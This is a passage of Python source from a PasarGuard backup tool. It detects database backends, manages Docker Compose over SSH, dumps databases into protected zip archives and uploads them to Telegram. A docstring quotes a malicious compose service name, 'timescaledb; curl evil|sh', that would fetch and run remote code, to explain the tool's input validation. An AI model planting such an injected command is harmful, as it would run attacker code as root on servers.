        f"docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d postgres -tA -c {shlex.quote(query)}",
        cwd=PASARGUARD_DIR,
    )
    if not ok_v or not out:
        print_warning("Could not enumerate Pasarguard databases — falling back to legacy 'pasarguard' only.")
        return ["pasarguard"]
    names = [l.strip() for l in out.splitlines() if l.strip()]
    if not names:
        print_warning("No user databases found — falling back to legacy 'pasarguard' only.")
        return ["pasarguard"]
    return names

def _list_databases_ssh(ssh, svc):
    query = ("SELECT datname FROM pg_database "
             "WHERE datistemplate=false AND datname NOT IN "
             "('postgres','template0','template1') ORDER BY datname;")
    ec, out, _ = ssh_shell(
        ssh,
        f"cd {PASARGUARD_DIR} && docker compose exec -T {shlex.quote(svc)} psql -U pasarguard -d postgres -tA -c {shlex.quote(query)}",
    )
    if ec != 0 or not out:
        print_warning("Could not enumerate Pasarguard databases on remote host — falling back to legacy 'pasarguard' only.")
        return ["pasarguard"]
    names = [l.strip() for l in out.splitlines() if l.strip()]
    if not names:
        print_warning("No user databases found on remote host — falling back to legacy 'pasarguard' only.")
        return ["pasarguard"]
    return names

def _ident(name):
    """Safely quote a PostgreSQL identifier for embedding in a SQL string.
    Doubles any embedded double-quotes, then wraps in double-quotes."""
    return '"' + name.replace('"', '""') + '"'

# ── PasarGuard backend detection (v4.1) ──────────────────────
SUPPORTED_BACKENDS = ("sqlite", "postgresql", "timescaledb", "mysql", "mariadb")

def _read_env_file(path):
    out = {}
    try:
        with open(path) as f:
            for raw in f:
                line = raw.strip()
                if not line or line.startswith("#"):
                    continue
                if "=" not in line:
                    continue
                k, v = line.split("=", 1)
                k = k.strip()
                v = v.strip()
                if len(v) >= 2 and v[0] == v[-1] and v[0] in ('"', "'"):
                    v = v[1:-1]
                out[k] = v
    except FileNotFoundError:
        pass
    return out

def _mask_secret(value):
    if not value:
        return ""
    if len(value) <= 4:
        return "****"
    return f"****{value[-4:]}"

def _parse_sqlalchemy_url(url):
    if not url:
        return (None, None, None, None, None, None)
    try:
        scheme_full, rest = url.split("://", 1)
    except ValueError:
        return (None, None, None, None, None, None)
    scheme = scheme_full.split("+", 1)[0].lower()

    if scheme == "sqlite":
        if rest.startswith("//"):
            rest = rest[1:]
        elif rest.startswith("/"):
            pass
        return (scheme, None, None, None, None, rest)

    user = password = host = port = dbname = None
    if "@" in rest:
        creds, rest = rest.split("@", 1)
        if ":" in creds:
            user, password = creds.split(":", 1)
        else:
            user = creds
    if "?" in rest:
        rest = rest.split("?", 1)[0]
    if "/" in rest:
        host_port, dbname = rest.split("/", 1)
    else:
        host_port, dbname = rest, ""
    if ":" in host_port:
        host, port_s = host_port.split(":", 1)
        try:
            port = int(port_s)
        except ValueError:
            port = None
    else:
        host = host_port
        port = None
    return (scheme, user, password, host, port, dbname)

def _compose_image_contains(svc_image, needle):
    if not svc_image:
        return False
    return needle.lower() in svc_image.lower()

def _list_compose_services_local(d=None):
    d = d or PASARGUARD_DIR
    ok_v, out, _ = local_shell("docker compose config 2>/dev/null", cwd=d)
    if not ok_v or not out:
        try:
            with open(os.path.join(d, "docker-compose.yml")) as f:
                out = f.read()
        except FileNotFoundError:
            return []
    return _parse_compose_services(out)

def _list_compose_services_ssh(ssh, d=None):
    d = d or PASARGUARD_DIR
    ec, out, _ = ssh_shell(ssh, f"cd {d} && docker compose config 2>/dev/null")
    if ec != 0 or not out:
        ec2, out2, _ = ssh_shell(ssh, f"cat {d}/docker-compose.yml 2>/dev/null")
        if ec2 != 0:
            return []
        out = out2
    return _parse_compose_services(out)

# Top-level keys that look like service names but aren't (would cause the
# script to try to exec into a non-existent "services" / "name" / "version"
# container if they leaked through a buggy parser). Defence in depth.
_NON_SERVICE_KEYS = frozenset({
    "services", "name", "version", "networks", "volumes",
    "configs", "secrets", "x-*",
})

def _parse_compose_services(yaml_text):
    """Parse `docker compose config` output (or raw docker-compose.yml) and
    return [(service_name, image_string), ...] for every service that has
    an image defined.

    v4.2.1 — the previous parser only matched top-level keys (no leading
    whitespace + ends with ':'), so on the canonical compose output

        services:
          timescaledb:
            image: timescale/timescaledb:latest
          pasarguard:
            image: ...

    it captured ('services', 'timescale/...') — i.e. it tried to exec into
    a service literally called `services` — and missed the real service
    names entirely. This parser walks the YAML by indentation: only keys
    indented under the `services:` block are treated as service names,
    and only `image:` lines indented under a service count as that
    service's image."""
    services = {}  # name -> image
    in_services_block = False
    current_service = None
    services_indent = None  # indent of `services:` itself

    for raw in yaml_text.splitlines():
        if not raw.strip() or raw.lstrip().startswith("#"):
            continue
        stripped = raw.lstrip()
        indent = len(raw) - len(stripped)

        # Top-level key detection. `services:` opens the block we care
        # about; any other top-level key closes it.
        if indent == 0:
            if stripped == "services:":
                in_services_block = True
                services_indent = 0
                current_service = None
                continue
            if in_services_block:
                # We've left the services block (e.g. hit `volumes:`,
                # `networks:`, etc).
                in_services_block = False
                current_service = None
                continue
            continue

        if not in_services_block:
            continue

        # We're inside the services: block. Lines at indent == 2 that end
        # with ':' are service names; their image: child defines the image.
        if (indent == 2 and stripped.endswith(":")
                and not stripped.startswith("-")
                and not stripped.startswith("&")  # YAML anchors
                and not stripped.startswith("*")):  # YAML aliases
            current_service = stripped[:-1].strip().strip("'\"")
            if current_service and current_service not in _NON_SERVICE_KEYS:
                services.setdefault(current_service, "")
            else:
                current_service = None  # ignore non-service keys just in case
            continue

        # We're inside a specific service — look for the image: line.
        if current_service and indent >= 4 and stripped.startswith("image:"):
            image = stripped[len("image:"):].strip()
            if len(image) >= 2 and image[0] == image[-1] and image[0] in ('"', "'"):
                image = image[1:-1]
            services[current_service] = image

    # Only return services that have an image (real running containers —
    # build-only / external services without `image:` can't be exec'd into).
    return [(name, img) for name, img in services.items() if img]

def _detect_backend_local():
    env = _read_env_file(os.path.join(PASARGUARD_DIR, ".env"))
    url = env.get("SQLALCHEMY_DATABASE_URL", "")
    scheme, user, pwd, host, port, dbname = _parse_sqlalchemy_url(url)
    services = _list_compose_services_local()
    return _resolve_backend(scheme, user, pwd, host, port, dbname, env, services)

def _detect_backend_ssh(ssh):
    ec, env_text, _ = ssh_shell(ssh, f"cat {PASARGUARD_DIR}/.env 2>/dev/null")
    env = {}
    if ec == 0 and env_text:
        for raw in env_text.splitlines():
            line = raw.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            k = k.strip()
            v = v.strip()
            if len(v) >= 2 and v[0] == v[-1] and v[0] in ('"', "'"):
                v = v[1:-1]
            env[k] = v
    url = env.get("SQLALCHEMY_DATABASE_URL", "")
    scheme, user, pwd, host, port, dbname = _parse_sqlalchemy_url(url)
    services = _list_compose_services_ssh(ssh)
    return _resolve_backend(scheme, user, pwd, host, port, dbname, env, services)

def _resolve_backend(scheme, user, pwd, host, port, dbname, env, services):
    db_type = None
    container = None

    if scheme == "sqlite":
        db_type = "sqlite"
        container = None
    elif scheme == "postgresql":
        is_ts = any(_compose_image_contains(img, "timescale") for _, img in services)
        db_type = "timescaledb" if is_ts else "postgresql"
        container = _pick_service_by_image(services,
            image_needles=("timescaledb", "timescale", "postgres", "postgresql", "pgsql"),
            name_needles=("timescaledb", "postgresql", "postgres", "pgsql", "db", "database"),
        )
    elif scheme in ("mysql", "mariadb"):
        is_mariadb = any(_compose_image_contains(img, "mariadb") for _, img in services)
        db_type = "mariadb" if is_mariadb else "mysql"
        container = _pick_service_by_image(services,
            image_needles=("mariadb", "mysql"),
            name_needles=("mariadb", "mysql", "db", "database"),
        )
    else:
        db_type = "postgresql"
        container = _pick_service_by_image(services,
            image_needles=("timescaledb", "postgres", "postgresql", "pgsql"),
            name_needles=("timescaledb", "postgres", "postgresql", "pgsql", "db", "database"),
        )

    if not user:   user   = env.get("DB_USER", "")
    if not pwd:    pwd    = env.get("DB_PASSWORD", "")
    if not dbname: dbname = env.get("DB_NAME", "pasarguard")
    if not host:   host   = "127.0.0.1"
    if not port:
        if db_type in ("postgresql", "timescaledb"):
            port = 5432
        elif db_type in ("mysql", "mariadb"):
            port = 3306
        else:
            port = 0

    sqlite_path = None
    if db_type == "sqlite" and dbname:
        sqlite_path = "/" + dbname

    return {
        "type":       db_type,
        "host":       host,
        "port":       port,
        "user":       user or "",
        "password":   pwd or "",
        "dbname":     dbname or "",
        "container":  container,
        "env":        env,
        "services":   services,
        "sqlite_path": sqlite_path,
    }

def _pick_service_by_image(services, image_needles=(), name_needles=()):
    """Pick the most likely DB service from a list of (name, image) tuples.
    Prefers exact image matches, then name-substring matches, then any service
    that looks like a database. Returns the service name or None.

    v4.2.1 — refuses to return a service name that doesn't match
    [A-Za-z0-9_.-]+. A malicious docker-compose.yml could otherwise carry
    a service name like `timescaledb; curl evil|sh` that would then be
    pasted unquoted into shell=True docker commands as root."""
    if not services:
        return None
    safe = [(n, i) for n, i in services if _SAFE_SERVICE_NAME_RE.match(n)]
    if not safe:
        return None
    if len(safe) == 1:
        return safe[0][0]
    for needle in image_needles:
        for name, img in safe:
            if img.lower() == needle.lower():
                return name
    for needle in image_needles:
        for name, img in safe:
            if needle.lower() in img.lower():
                return name
    for needle in name_needles:
        for name, _ in safe:
            if needle.lower() in name.lower():
                return name
    return safe[0][0]

# ── Docker compose helpers ────────────────────────────────────
def _running_ids_local(d):
    _, out, _ = local_shell("docker compose ps -q --status running", cwd=d)
    return [l for l in out.splitlines() if l.strip()]

def _running_ids_ssh(ssh, d):
    _, out, _ = ssh_shell(ssh, f"cd {d} && docker compose ps -q --status running 2>/dev/null || true")
    return [l for l in out.splitlines() if l.strip()]

def _expected_count_local(d, services):
    if services: return len(services)
    ok_v, out, _ = local_shell("docker compose config --services", cwd=d)
    return len([l for l in out.splitlines() if l.strip()]) if ok_v else 0

def _expected_count_ssh(ssh, d, services):
    if services: return len(services)
    ec, out, _ = ssh_shell(ssh, f"cd {d} && docker compose config --services 2>/dev/null")
    return len([l for l in out.splitlines() if l.strip()]) if ec == 0 else 0

def stop_compose_local(d, label):
    if not os.path.isdir(d) or not os.path.isfile(os.path.join(d, "docker-compose.yml")):
        print_warning(f"{label}: not found or missing compose file — skipping stop.")
        return True
    print_info(f"Stopping {label} containers...")
    for attempt in range(1, COMPOSE_STOP_RETRIES + 1):
        run_command(f"docker compose down --remove-orphans -t {COMPOSE_DOWN_TIMEOUT}", cwd=d)
        run_command("docker compose stop -t 10 2>/dev/null || true", cwd=d)
        run_command("docker compose rm -f 2>/dev/null || true", cwd=d)
        if not _running_ids_local(d):
            print_success(f"{label}: all containers stopped.")
            return True
        print_warning(f"{label}: still running (attempt {attempt}/{COMPOSE_STOP_RETRIES})...")
        time.sleep(2)
    print_error(f"{label}: could not stop all containers.")
    return False

def stop_compose_ssh(ssh, d, label):
    ec, _, _ = ssh_shell(ssh, f"test -d {d} && test -f {d}/docker-compose.yml")
    if ec != 0:
        print_warning(f"{label}: not found or missing compose file — skipping stop.")
        return True
    print_info(f"Stopping {label} containers...")
    for attempt in range(1, COMPOSE_STOP_RETRIES + 1):
        ssh_shell(ssh, f"cd {d} && docker compose down --remove-orphans -t {COMPOSE_DOWN_TIMEOUT}")
        ssh_shell(ssh, f"cd {d} && docker compose stop -t 10 2>/dev/null || true")
        ssh_shell(ssh, f"cd {d} && docker compose rm -f 2>/dev/null || true")
        if not _running_ids_ssh(ssh, d):
            print_success(f"{label}: all containers stopped.")
            return True
        print_warning(f"{label}: still running (attempt {attempt}/{COMPOSE_STOP_RETRIES})...")
        time.sleep(2)
    print_error(f"{label}: could not stop all containers.")
    return False

def wait_postgres_local():
    svc = db_service_local()
    print_info(f"Waiting for {svc} to become ready...")
    deadline = time.time() + POSTGRES_READY_MAX_WAIT
    while time.time() < deadline:
        ok_v, _, _ = local_shell(
            f"docker compose exec -T {shlex.quote(svc)} pg_isready -U pasarguard -d postgres", cwd=PASARGUARD_DIR)
        if ok_v:
            print_success("Database is ready.")
            return True
        time.sleep(POSTGRES_READY_INTERVAL)
    print_error("Database did not become ready in time.")
    return False

def wait_postgres_ssh(ssh):
    svc = db_service_ssh(ssh)
    print_info(f"Waiting for {svc} to become ready...")
    deadline = time.time() + POSTGRES_READY_MAX_WAIT
    while time.time() < deadline:
        ec, _, _ = ssh_shell(
            ssh, f"cd {PASARGUARD_DIR} && docker compose exec -T {shlex.quote(svc)} pg_isready -U pasarguard -d postgres")
        if ec == 0:
            print_success("Database is ready.")
            return True
        time.sleep(POSTGRES_READY_INTERVAL)
    print_error("Database did not become ready in time.")
    return False

def start_compose_local(d, label, services=None, wait_postgres=False):
    if not os.path.isdir(d) or not os.path.isfile(os.path.join(d, "docker-compose.yml")):
        print_error(f"{label}: compose project not found at {d}")
        return False
    # v4.2.1 — validate + quote each service individually before joining
    # (a malicious compose could otherwise yield service names with shell
    # metachars; the joined-then-quoted form would also be wrong because
    # shlex.quote wraps the whole space-joined string as one argument).
    safe_services = []
    for s in (services or []):
        try:
            safe_services.append(_validate_service_name(s))
        except ValueError as e:
            print_error(f"{label}: {e}")
            return False
    svc_q = " ".join(shlex.quote(s) for s in safe_services)
    print_info(f"Starting {label} containers{f' ({svc_q})' if svc_q else ''}...")
    if not run_command(f"docker compose up -d {svc_q}".strip(), cwd=d):
        print_error(f"{label}: docker compose up failed.")
        return False
    if wait_postgres and not wait_postgres_local():
        return False
    expected = _expected_count_local(d, services)
    if expected == 0 and not wait_postgres:
        print_warning(f"{label}: assuming startup succeeded.")
        return True
    deadline = time.time() + COMPOSE_UP_MAX_WAIT
    while time.time() < deadline:
        if len(_running_ids_local(d)) >= expected:
            print_success(f"{label}: containers running.")
            return True
        time.sleep(COMPOSE_UP_INTERVAL)
    print_error(f"{label}: startup verification failed.")
    return False

def start_compose_ssh(ssh, d, label, services=None, wait_postgres=False):
    ec, _, _ = ssh_shell(ssh, f"test -d {d} && test -f {d}/docker-compose.yml")
    if ec != 0:
        print_error(f"{label}: compose project not found at {d}")
        return False
    # v4.2.1 — validate + quote each service individually before joining.
    safe_services = []
    for s in (services or []):
        try:
            safe_services.append(_validate_service_name(s))
        except ValueError as e:
            print_error(f"{label}: {e}")
            return False
    svc_q = " ".join(shlex.quote(s) for s in safe_services)
    print_info(f"Starting {label} containers{f' ({svc_q})' if svc_q else ''}...")
    ec, _, er = ssh_shell(ssh, f"cd {d} && docker compose up -d {svc_q}".strip())
    if ec != 0:
        print_error(f"{label}: docker compose up failed.")
        if er: print_error(er)
        return False
    if wait_postgres and not wait_postgres_ssh(ssh):
        return False
    expected = _expected_count_ssh(ssh, d, services)
    if expected == 0 and not wait_postgres:
        print_warning(f"{label}: assuming startup succeeded.")
        return True
    deadline = time.time() + COMPOSE_UP_MAX_WAIT
    while time.time() < deadline:
        if len(_running_ids_ssh(ssh, d)) >= expected:
            print_success(f"{label}: containers running.")
            return True
        time.sleep(COMPOSE_UP_INTERVAL)
    print_error(f"{label}: startup verification failed.")
    return False

def clean_dirs_local(include_node=True):
    targets = [
        (PASARGUARD_DIR,      "Pasarguard config (/opt/pasarguard)"),
        (PASARGUARD_DATA_DIR, "Pasarguard data (/var/lib/pasarguard)"),
    ]
    if include_node:
        targets += [
            (PG_NODE_DIR,      "PG-Node config (/opt/pg-node)"),
            (PG_NODE_DATA_DIR, "PG-Node data (/var/lib/pg-node)"),
        ]
    print_info("Cleaning target directories...")
    for path, desc in targets:
        if not run_command(f"rm -rf {path} && mkdir -p {path}", quiet=True):
            print_error(f"Failed to clean {desc}")
            return False
    print_success("Target directories cleaned.")
    return True

def clean_dirs_ssh(ssh, include_node=True):
    targets = [
        (PASARGUARD_DIR,      "Pasarguard config"),
        (PASARGUARD_DATA_DIR, "Pasarguard data"),
    ]
    if include_node:
        targets += [
            (PG_NODE_DIR,      "PG-Node config"),
            (PG_NODE_DATA_DIR, "PG-Node data"),
        ]
    print_info("Cleaning target directories...")
    for path, desc in targets:
        ec, _, er = ssh_shell(ssh, f"rm -rf {path} && mkdir -p {path}")
        if ec != 0:
            print_error(f"Failed to clean {desc}")
            return False
    print_success("Target directories cleaned.")
    return True

# ── Telegram ─────────────────────────────────────────────────
def send_telegram_file(token, chat_id, file_path, caption="", proxy=None):
    url      = f"https://api.telegram.org/bot{token}/sendDocument"
    boundary = f"----WKF{uuid.uuid4().hex}"
    if not os.path.exists(file_path):
        return False, "File not found"
    try:
        with open(file_path, "rb") as f:
            fc = f.read()
    except Exception as e:
        return False, str(e)
    fn    = os.path.basename(file_path)
    parts = []
    def field(n, v):
        parts.append(f"--{boundary}".encode())
        parts.append(f'Content-Disposition: form-data; name="{n}"'.encode())
        parts.append(b"")
        parts.append(v.encode() if isinstance(v, str) else v)
    field("chat_id", str(chat_id))
    if caption:
        field("caption", caption)
    parts.append(f"--{boundary}".encode())
    parts.append(f'Content-Disposition: form-data; name="document"; filename="{fn}"'.encode())
    parts.append(b"Content-Type: application/zip")
    parts.append(b"")
    parts.append(fc)
    parts.append(f"--{boundary}--".encode())
    parts.append(b"")
    body = b"\r\n".join(parts)
    req  = urllib.request.Request(url, data=body)
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    req.add_header("Content-Length", str(len(body)))

    opener, socks_ctx = None, None
    if proxy:
        scheme, host, port, user, pwd = _parse_proxy_url(proxy)
        if scheme in ("socks5", "socks5h", "socks4", "socks4a"):
            if _pysocks is None:
                return False, "PySocks is required for SOCKS proxies but could not be installed"
            proxy_type = _pysocks.SOCKS4 if scheme.startswith("socks4") else _pysocks.SOCKS5
            rdns = scheme in ("socks5h", "socks4a")
            socks_ctx = _SocksProxySocket(proxy_type, host, port, user, pwd, rdns=rdns)
        elif scheme in ("http", "https"):
            opener = urllib.request.build_opener(
                urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        else:
            return False, f"Unsupported proxy scheme: '{scheme}' (use http://, socks5:// or socks4://)"
    if opener is None:
        opener = urllib.request.build_opener()

    try:
        if socks_ctx:
            with socks_ctx:
                with opener.open(req, timeout=60) as r:
                    return True, r.read().decode()
        else:
            with opener.open(req, timeout=60) as r:
                return True, r.read().decode()
    except urllib.error.HTTPError as e:
        return False, f"HTTP {e.code}: {e.read().decode()}"
    except Exception as e:
        return False, str(e)

def _parse_proxy_url(proxy):
    from urllib.parse import urlparse
    p = urlparse(proxy)
    return p.scheme.lower(), p.hostname, p.port, p.username, p.password

class _SocksProxySocket:
    def __init__(self, proxy_type, host, port, username=None, password=None, rdns=True):
        self.proxy_type = proxy_type
        self.host, self.port = host, port
        self.username, self.password = username, password
        self.rdns = rdns
        self._orig_socket = None

    def __enter__(self):
        self._orig_socket = socket.socket
        _pysocks.set_default_proxy(self.proxy_type, self.host, self.port,
                                    rdns=self.rdns, username=self.username, password=self.password)
        socket.socket = _pysocks.socksocket
        return self

    def __exit__(self, *exc):
        socket.socket = self._orig_socket
        return False

def ask_telegram_proxy():
    ans = input(f" {C.R2}> Use a proxy for Telegram upload? (y/n): {C.RESET}").strip().lower()
    if ans != "y":
        return None
    proxy = input(
        f" {C.R2}> Proxy address (e.g. http://127.0.0.1:10809 or socks5h://127.0.0.1:1080): {C.RESET}"
    ).strip()
    return proxy or None

# ── Telegram file size handling ───────────────────────────────
TELEGRAM_BOT_MAX_FILE_SIZE = 50 * 1024 * 1024
TELEGRAM_SAFE_CHUNK_SIZE   = 49 * 1024 * 1024

def _split_file_into_chunks(file_path, chunk_size=TELEGRAM_SAFE_CHUNK_SIZE):
    file_size = os.path.getsize(file_path)
    if file_size <= chunk_size:
        return {"needs_split": False, "chunks": [file_path],
                "original": file_path, "total_size": file_size}

    base_dir  = os.path.dirname(file_path)
    base_name = os.path.basename(file_path)
    total     = (file_size + chunk_size - 1) // chunk_size

    parts = []
    with open(file_path, "rb") as src:
        for i in range(1, total + 1):
            chunk_path = os.path.join(base_dir, f"{base_name}.{i:03d}")
            with open(chunk_path, "wb") as dst:
                written = 0
                while written < chunk_size:
                    buf = src.read(min(chunk_size - written, 1024 * 1024))
                    if not buf:
                        break
                    dst.write(buf)
                    written += len(buf)
            parts.append(chunk_path)

    return {"needs_split": True, "chunks": parts,
            "original": file_path, "total_size": file_size}


def send_telegram_backup_archive(file_path, caption, token, chat_id, proxy=None):
    if not os.path.exists(file_path):
        return False, "File not found"

    info     = _split_file_into_chunks(file_path)
    chunks   = info["chunks"]
    original = info["original"]
    total    = len(chunks)

    if info["needs_split"]:
        size_mb = info["total_size"] / 1024 / 1024
        print_warning(
            f"Backup is {size_mb:.1f} MB — exceeds Telegram Bot API's "
            f"50 MB limit. Splitting into {total} parts…"
        )

    try:
        for idx, chunk_path in enumerate(chunks, 1):
            chunk_mb = os.path.getsize(chunk_path) / 1024 / 1024
            if info["needs_split"]:
                base_name = os.path.basename(original)
                cap = (
                    f"{caption}\n"
                    f"\n"
                    f"Part {idx}/{total}  ({chunk_mb:.1f} MB)\n"
                    f"\n"
                    f"To rejoin all parts on the server:\n"
                    f"  cat '{base_name}.*' > '{base_name}'\n"
                    f"Then unzip normally."
                )
            else:
                cap = caption
            label = f"part {idx}/{total} " if info["needs_split"] else ""
            print_info(f"Uploading {label}({chunk_mb:.1f} MB)…")
            ok, details = send_telegram_file(token, chat_id, chunk_path, cap, proxy)
            if not ok:
                print_error(f"Upload failed: {details}")
                return False, details
            if info["needs_split"]:
                print_success(f"Part {idx}/{total} sent.")
            else:
                print_success("Sent.")
    finally:
        if info["needs_split"]:
            for chunk_path in chunks:
                if chunk_path != original:
                    try:
                        os.remove(chunk_path)
                    except Exception:
                        pass

    return True, "OK"


def _join_chunks_if_needed(zip_name):
    """If chunks matching `zip_name` (e.g. `backup.zip.001`, `.002`, ...)
    exist in the same directory, automatically concatenate them into
    `base` and return the joined path. Otherwise return `zip_name`
    unchanged. Handles both the base name and the first-chunk name as
    input. Returns None if chunks are incomplete (gaps in numbering)."""
    import re, glob

    base = zip_name
    m = re.match(r"^(.*)\.(\d{3})$", zip_name)
    if m:
        base = m.group(1)

    candidates = sorted(glob.glob(base + ".*"))
    parts = [c for c in candidates if re.search(r"\.\d{3}$", c)]

    if len(parts) < 2:
        return base

    nums = sorted(int(re.search(r"\.(\d{3})$", p).group(1)) for p in parts)
    expected = list(range(1, len(parts) + 1))
    if nums != expected:
        missing = sorted(set(expected) - set(nums))
        print_error(f"Incomplete chunks: found {len(parts)}, missing {missing}")
        return None

    print_info(f"Detected {len(parts)} Telegram chunks. Joining into {C.BOLD}{base}{C.RESET}…")
    total_bytes = 0
    with open(base, "wb") as out:
        for p in parts:
            sz = os.path.getsize(p)
            print_info(f"  + {os.path.basename(p)} ({sz / 1024 / 1024:.1f} MB)")
            with open(p, "rb") as f:
                shutil.copyfileobj(f, out, length=1024 * 1024)
            total_bytes += sz

    print_success(f"Joined into {base} ({total_bytes / 1024 / 1024:.1f} MB total)")

    yn = input(
        f"  {C.R2}> Delete the {len(parts)} chunk files now that we have "
        f"the joined archive? (y/n): {C.RESET}"
    ).strip().lower()
    if yn == "y":
        for p in parts:
            try:
                os.remove(p)
            except Exception:
                pass
        print_success(f"Deleted {len(parts)} chunk files.")
    else:
        print_info("Chunks left on disk — delete them manually when no longer needed.")

    return base


# ── Backup scope selector ─────────────────────────────────────
def ask_backup_scope():
    print()
    print(f"  {C.R2}What do you want to back up?{C.RESET}")
    print()
    print(f"  {C.R1}1{C.RESET}  {C.R3}-{C.RESET}  {C.WH}PasarGuard only{C.RESET}  "
          f"{C.R3}(/opt/pasarguard + DB + /var/lib/pasarguard){C.RESET}")
    print(f"  {C.R1}2{C.RESET}  {C.R3}-{C.RESET}  {C.WH}PasarGuard + PG-Node{C.RESET}  "
          f"{C.R3}(everything above + /opt/pg-node + /var/lib/pg-node){C.RESET}")
    print()
    while True:
        choice = input(f"  {C.R2}> Enter 1 or 2: {C.RESET}").strip()
        if choice in ("1", "2"):
            return choice == "2"
        print_error("Invalid choice. Enter 1 or 2.")

# ── Backup creation ───────────────────────────────────────────
def create_backup(include_node=True):
    scope_label = "PasarGuard + PG-Node" if include_node else "PasarGuard only"
    print_info(f"Starting backup  scope: {C.BOLD}{scope_label}{C.RESET}")

    try:
        backend = _detect_backend_local()
    except Exception as e:
        print_warning(f"Backend auto-detection failed: {e} — assuming legacy postgres+pasarguard")
        backend = {
            "type": "postgresql", "host": "127.0.0.1", "port": 5432,
            "user": "pasarguard", "password": "", "dbname": "pasarguard",
            "container": None, "env": {}, "services": [], "sqlite_path": None,
        }
    print_info(
        f"Detected backend: {C.BOLD}{backend['type']}{C.RESET}  "
        f"db={backend['dbname']}  user={backend['user']}  "
        f"host={backend['host']}:{backend['port']}  "
        f"container={backend['container'] or '(none — sqlite)'}"
    )

    ts          = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
    scope_tag   = "full" if include_node else "pg"
    backup_name = f"backup_{scope_tag}_{ts}"
    # v4.2.1 — was f"/tmp/{backup_name}" (world-readable 0755 while the
    # unencrypted dump + .env lived there). tempfile.mkdtemp gives us a
    # 0700 dir that only this process can read, and we always clean up
    # via shutil.rmtree(tmp_dir, ...) below.
    tmp_dir     = tempfile.mkdtemp(prefix=f"{backup_name}_")
    final_base  = os.path.join(os.getcwd(), backup_name)
    zip_path    = f"{final_base}.zip"

    db_dir        = os.path.join(tmp_dir, "db_dump")
    pg_data_dest  = os.path.join(tmp_dir, "pasarguard_data")
    node_opt_dest = os.path.join(tmp_dir, "pg_node_opt")
    node_data_dest= os.path.join(tmp_dir, "pg_node_data")

    try:
        os.makedirs(db_dir, exist_ok=True)

        print_info("Copying PasarGuard config files...")
        for fn in ("docker-compose.yml", ".env"):
            src = os.path.join(PASARGUARD_DIR, fn)
            if os.path.exists(src):
                shutil.copy(src, tmp_dir)

        if not _backup_database_local(backend, db_dir):
            print_error("Database backup failed. Aborting.")
            shutil.rmtree(tmp_dir, ignore_errors=True)
            return None

        if os.path.exists(PASARGUARD_DATA_DIR):
            print_info("Copying PasarGuard data directory...")
            shutil.copytree(PASARGUARD_DATA_DIR, pg_data_dest)
        else:
            print_warning(f"{PASARGUARD_DATA_DIR} not found — skipped")

        if include_node:
            if os.path.exists(PG_NODE_DIR):
                print_info("Copying PG-Node config (/opt/pg-node)...")
                shutil.copytree(PG_NODE_DIR, node_opt_dest)
            else:
                print_warning(f"{PG_NODE_DIR} not found — skipped")
            if os.path.exists(PG_NODE_DATA_DIR):
                print_info("Copying PG-Node data (/var/lib/pg-node)...")
                shutil.copytree(PG_NODE_DATA_DIR, node_data_dest)
            else:
                print_warning(f"{PG_NODE_DATA_DIR} not found — skipped")

        print_info("Compressing archive...")
        # v4.2.1 — set a 0700 umask BEFORE make_archive so the .zip is
        # created with owner-only perms atomically. The previous
        # make_archive-then-chmod flow had a TOCTOU window where any
        # local user could read the .env (with DB passwords) before
        # chmod 0600 ran.
        old_umask = os.umask(0o077)
        try:
            shutil.make_archive(final_base, "zip", tmp_dir)
        finally:
            os.umask(old_umask)
        shutil.rmtree(tmp_dir, ignore_errors=True)

        # Belt-and-braces — explicitly chmod in case umask was overridden
        # by something else in the script.
        try:
            os.chmod(zip_path, 0o600)
        except Exception:
            pass

        print_success(f"Archive: {zip_path}")
        return zip_path

    except Exception as e:
        print_error(f"Backup failed: {e}")
        shutil.rmtree(tmp_dir, ignore_errors=True)
        return None

# ── Per-backend local backup dispatchers ──────────────────────
def _backup_database_local(backend, db_dir):
    t = backend["type"]
    if t in ("postgresql", "timescaledb"):
        return _backup_postgres_local(backend, db_dir)
    if t in ("mysql", "mariadb"):
        return _backup_mysql_local(backend, db_dir)
    if t == "sqlite":
        return _backup_sqlite_local(backend, db_dir)
    print_error(f"Unsupported backend type: '{t}'")
    return False

def _backup_postgres_local(backend, db_dir):
    svc = backend.get("container") or "postgres"
    user = backend["user"] or "pasarguard"

    print_info("Exporting PostgreSQL globals (pg_dumpall)...")
    run_command(
        f"docker compose exec -T {shlex.quote(svc)} pg_dumpall -U {shlex.quote(user)} --globals-only",
        output_file=os.path.join(db_dir, "globals.sql"),
        cwd=PASARGUARD_DIR,
    )

    databases = _list_databases_local(svc)
    print_info(f"Found {len(databases)} Pasarguard database(s): {', '.join(databases)}")

    manifest_path = os.path.join(db_dir, "manifest.tsv")
    with open(manifest_path, "w") as mf:
        mf.write(f"# pg_backup_manifest\tv4.2\tformat=tsv\tdb_type={backend['type']}\n")
        for idx, db in enumerate(databases, 1):
            sql_file = f"db-{idx:03d}.sql"
            has_ts, ts_ver = _pg_db_timescale_info(svc, user, db)
            print_info(f"Exporting database {C.BOLD}{db}{C.RESET} → {sql_file}  (may take a while)")
            run_command(
                f"docker compose exec -T {shlex.quote(svc)} pg_dump -U {shlex.quote(user)} "
                f"--clean --if-exists -d {shlex.quote(db)}",
                output_file=os.path.join(db_dir, sql_file),
                cwd=PASARGUARD_DIR,
            )
            mf.write(f"{db}\t{user}\t{1 if has_ts else 0}\t{sql_file}\t{ts_ver}\n")

    print_success(f"Wrote manifest with {len(databases)} database entr{'y' if len(databases)==1 else 'ies'}.")
    return True

def _pg_db_timescale_info(svc, user, dbname):
    query = "SELECT extversion FROM pg_extension WHERE extname='timescaledb' LIMIT 1;"
    ok_v, out, _ = local_shell(
        f"docker compose exec -T {shlex.quote(svc)} psql -U {shlex.quote(user)} -d {shlex.quote(dbname)} "
        f"-tA -c {shlex.quote(query)}",
        cwd=PASARGUARD_DIR,
    )
    if not ok_v:
        return False, ""
    version = out.strip().splitlines()
    if version and version[0]:
        return True, version[0]
    return False, ""

def _backup_mysql_local(backend, db_dir):
    """Dump a single MySQL/MariaDB database (the official panel only uses
    one DB per install).

    v4.2 fix: MYSQL_PWD must be set *inside the container*, not on the host
    shell that runs `docker compose`. `docker compose exec` does not forward
    the host environment to the container unless told to with `-e`, so the
    previous `MYSQL_PWD=... docker compose exec ...` form silently had no
    effect and mysqldump would hang on / fail an interactive password
